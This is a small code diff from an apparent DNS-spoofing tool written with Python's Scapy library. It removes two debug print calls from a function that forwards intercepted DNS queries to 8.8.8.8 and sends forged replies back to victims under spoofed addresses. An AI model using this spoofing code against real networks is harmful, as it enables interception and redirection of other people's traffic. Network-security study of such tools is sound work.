@@ -37,11 +37,9 @@ def forwardDnsSpoofing(spooferIP):
         else:
             print('DNS Forwarding')
             newPacket = IP(dst='8.8.8.8') / UDP(sport=orgPacket[UDP].sport, dport=53) / DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
-            newPacket.show()
             answer = scapy.sr1(newPacket)
             respPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS()
             respPacket[DNS] = answer[DNS]
-            respPacket.show()
             scapy.send(respPacket, verbose=1)
             print('DNS Forwarded')
     print('DNS spoofing started')
